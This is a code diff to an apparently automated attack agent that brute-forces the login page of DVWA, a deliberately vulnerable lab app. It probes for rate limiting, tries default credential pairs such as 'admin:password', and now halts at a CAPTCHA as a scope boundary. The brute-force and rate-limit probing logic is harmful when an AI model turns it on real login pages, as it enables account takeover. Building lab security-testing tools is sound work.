@@ -7,9 +7,8 @@ import time as time_mod
 from typing import Any
 
 from agents.agent_telemetry import exploit_event, probe_event, score_event
-from agents.state_utils import already_tried_payloads, chain_check as _chain_check, make_update, normalize_security_level
+from agents.state_utils import already_tried_payloads, candidate_payloads_for_stage, chain_check as _chain_check, make_update, normalize_security_level
 from core.state import ExploitationState, MODULE_TO_KG_NODE
-from foundation.payload_library import PayloadLibrary
 from foundation.session_manager import DVWASession
 from foundation.verifier import Verifier
 
@@ -23,21 +22,19 @@ _SUCCESS_SIGNALS = [
     "welcome to the password protected area",
     "password protected area",
 ]
-_FAILURE_SIGNALS = [
-    "username and/or password incorrect",
-    "incorrect",
-]
 _CAPTCHA_SIGNALS = [
     "captcha",
     "recaptcha",
     "please enter the captcha",
 ]
 
-_RATE_LIMIT_THRESHOLD = 2.0  # seconds for 3 rapid requests
-
 
 def _probe_preconditions(
-    session: DVWASession, payloads: list[str], already_tried: set[str]
+    session: DVWASession,
+    payloads: list[str],
+    already_tried: set[str],
+    *,
+    cached_precondition: bool | None = None,
 ) -> tuple[bool, list[str], dict[str, bool], list[dict]]:
     """Send rapid requests to detect rate limiting.
 
@@ -74,6 +71,9 @@ def _probe_preconditions(
     probe_elapsed = time_mod.monotonic() - probe_start
 
     if not sent_any:
+        if cached_precondition is not None:
+            observations[_PROBE_OBSERVATION_KEY] = bool(cached_precondition)
+            return bool(cached_precondition), tried, observations, events
         return True, tried, {}, events  # Assume no rate limit if already probed
 
     # Normalize by request count to avoid false negatives on large probe sets
@@ -98,7 +98,7 @@ def _parse_credential(payload: str) -> tuple[str, str]:
 def _attempt_exploit(
     session: DVWASession, payloads: list[str], already_tried: set[str],
     security_level: str,
-) -> tuple[int, list[str], list[str], list[dict], list[dict[str, str]]]:
+) -> tuple[int, list[str], list[str], list[dict], list[dict[str, str]], bool]:
     """Try credential pairs. Returns (score, tried, confirmed, events, found_credentials)."""
     tried: list[str] = []
     events: list[dict] = []
@@ -128,8 +128,7 @@ def _attempt_exploit(
             # Check for CAPTCHA (out of scope)
             captcha_result = verifier.contains_any(resp.text, _CAPTCHA_SIGNALS)
             if captcha_result.ok:
-                score = max(score, 1)
-                break
+                return 0, tried, [], events, [], True
 
             # Full exploit: successful login
             success_result = verifier.contains_any(resp.text, _SUCCESS_SIGNALS)
@@ -146,7 +145,7 @@ def _attempt_exploit(
         if delay:
             time_mod.sleep(delay)
 
-    return score, tried, confirmed, events, found_credentials
+    return score, tried, confirmed, events, found_credentials, False
 
 def bf_dictionary_agent(state: ExploitationState) -> dict[str, Any]:
     """Run PROBE -> EXPLOIT -> CHAIN CHECK for bf_dictionary."""
@@ -165,9 +164,6 @@ def bf_dictionary_agent(state: ExploitationState) -> dict[str, Any]:
             )
         session.set_security_level(security_level)
 
-        payload_lib = PayloadLibrary()
-        payload_set = payload_lib.get(AGENT_ID, security_level)
-
         already_tried = already_tried_payloads(state, AGENT_ID)
         confirmed_vulns: list[str] = []
         achieved_outcomes: list[str] = []
@@ -178,9 +174,10 @@ def bf_dictionary_agent(state: ExploitationState) -> dict[str, Any]:
         observations: dict[str, bool] = {}
 
         # Stage 1: PROBE
-        probe_payloads = list(payload_set.probe) or ["admin:password", "admin:admin"]
+        probe_payloads = candidate_payloads_for_stage(state, AGENT_ID, security_level, "probe") or ["rate_test:test", "probe:probe"]
+        cached_no_rate_limit = state.get("observations", {}).get(_PROBE_OBSERVATION_KEY)
         probe_ok, tried, probe_obs, probe_events = _probe_preconditions(
-            session, probe_payloads, already_tried
+            session, probe_payloads, already_tried, cached_precondition=cached_no_rate_limit
         )
         all_tried.extend(tried)
         telemetry_events.extend(probe_events)
@@ -197,15 +194,30 @@ def bf_dictionary_agent(state: ExploitationState) -> dict[str, Any]:
         score = max(score, 1)
 
         # Stage 2: EXPLOIT
-        exploit_payloads = list(payload_set.exploit) or [
+        all_exploit = candidate_payloads_for_stage(state, AGENT_ID, security_level, "exploit") or [
             "admin:password", "gordonb:abc123", "pablo:letmein", "smithy:password"
         ]
-        bypass_payloads = list(payload_set.bypass.get(security_level, []))
-        all_exploit = exploit_payloads + bypass_payloads
 
-        exploit_score, tried, confirmed, exploit_events, creds = _attempt_exploit(
+        exploit_score, tried, confirmed, exploit_events, creds, captcha_boundary = _attempt_exploit(
             session, all_exploit, already_tried | set(all_tried), security_level,
         )
+        if captcha_boundary:
+            all_tried.extend(tried)
+            telemetry_events.extend(exploit_events)
+            update = make_update(
+                state=state,
+                module_name=AGENT_ID,
+                score=0,
+                tried_payloads=all_tried,
+                telemetry_events=telemetry_events,
+                next_agent="scorer",
+                failure_agents=[AGENT_ID],
+                blocked_agents=[AGENT_ID],
+                task_result="INCOMPLETE",
+                incomplete_reason="SCOPE_BOUNDARY",
+            )
+            update["observations"] = observations
+            return update
         all_tried.extend(tried)
         telemetry_events.extend(exploit_events)
         score = max(score, exploit_score)
